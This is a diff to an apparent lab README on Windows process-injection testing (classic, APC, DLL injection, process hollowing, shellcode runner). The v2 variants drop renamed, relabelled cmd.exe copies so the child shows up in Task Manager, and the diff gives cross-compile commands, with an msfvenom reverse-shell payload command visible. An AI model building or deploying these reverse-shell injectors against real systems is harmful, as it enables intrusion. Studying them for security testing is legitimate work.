@@ -73,18 +73,36 @@ msfvenom -p windows/x64/shell_reverse_tcp \
 | **Process Hollowing** | Payload runs under a legitimate process name | Complex (relocations + imports), unusual process-tree pattern |
 | **Shellcode Runner** (self-injection) | Simplest shellcode test; validates msfvenom output before injection | Not a remote-injection primitive |
 
-## Making the child process identifiable in Task Manager
+## v2 variants — identifiable child in Task Manager
 
-Default msfvenom shellcode (`CMD=calc.exe`) spawns `calc.exe` — looks identical to any normal calc. To get a child that's **clearly yours** in Task Manager (big-text "RevShell - WinCmd Proc" + Image Name `revShell.exe`), use `dll_injection.c` with the companion DLL from `../../../thick-client/payload/proc-injection-2/`:
+The v1 files above spawn the generic shellcode payload (default `calc.exe`) — looks identical to any normal calc. **v2** variants pre-rename a system binary and patch its `FileDescription` so the child shows up in Task Manager with a custom name:
+
+| File | What it drops | Big text (FileDescription) | Image name |
+|---|---|---|---|
+| [`classic_injection_v2.c`](classic_injection_v2.c) | `C:\Users\Public\RevShell_C.exe` | `RevShell-ClassicInj` | `RevShell_C.exe` |
+| [`apc_injection_v2.c`](apc_injection_v2.c) | `C:\Users\Public\RevShell_A.exe` | `RevShell-APC Inject` | `RevShell_A.exe` |
+| [`dll_injection_v2.c`](dll_injection_v2.c) | (depends on the DLL — reference: `payload/proc-injection-2/revshell_pure_dll.dll`) | `RevShell - WinCmd Proc` | `revShell.exe` |
+| [`process_hollowing_v2.c`](process_hollowing_v2.c) | `C:\Users\Public\RevShell_H.exe` (renamed host) | `RevShell-Hollow Proc` | `RevShell_H.exe` |
+| [`shellcode_runner_v2.c`](shellcode_runner_v2.c) + [`.rc`](shellcode_runner_v2.rc) | the runner itself | `RevShell Runner` | `runner_v2.exe` |
+
+Build v2 the same way as v1 (plus a resource compile step for `shellcode_runner_v2`):
 
 ```bash
-# victim side
-dll_inject.exe <PID> C:\path\to\revshell_pure_dll.dll
+# Linux cross-compile
+for f in classic_injection_v2 apc_injection_v2 process_hollowing_v2; do
+  x86_64-w64-mingw32-gcc -o $f.exe $f.c
+done
+x86_64-w64-mingw32-gcc -o dll_inject_v2.exe dll_injection_v2.c -lpsapi
+x86_64-w64-mingw32-windres shellcode_runner_v2.rc -o rc.o
+x86_64-w64-mingw32-gcc -o runner_v2.exe shellcode_runner_v2.c rc.o
 ```
 
-That DLL copies `C:\Windows\System32\cmd.exe` next to the host EXE (fallback: `%USERPROFILE%`), patches its `FileDescription` to `"RevShell - WinCmd Proc"`, then spawns the renamed copy with the socket as stdin/stdout. The child is identifiable at a glance in Task Manager's Processes tab under the host app.
+The identifier approach used by each v2 variant:
 
-See [`../../payload/proc-injection-2/README.md`](../../payload/proc-injection-2/README.md).
+- **Shellcode injectors (classic, APC)**: hand-crafted ~45-byte x64 shellcode calls `WinExec(renamed_path, SW_SHOWNORMAL)`. The injector pre-copies cmd.exe and patches its VERSIONINFO before firing.
+- **DLL injection**: identifier logic lives inside the loaded DLL (reference: [`payload/proc-injection-2/revshell_pure_dll.dll`](../../payload/proc-injection-2/)). The v2 injector just loads any identifier-aware DLL.
+- **Process hollowing**: renames and patches the host binary before `CreateProcess SUSPENDED`. The hollow runs under the custom name.
+- **Shellcode runner**: the runner itself gets a custom VERSIONINFO via `.rc` — Task Manager Processes tab shows the runner as `"RevShell Runner"`.
 
 ## Legal
 
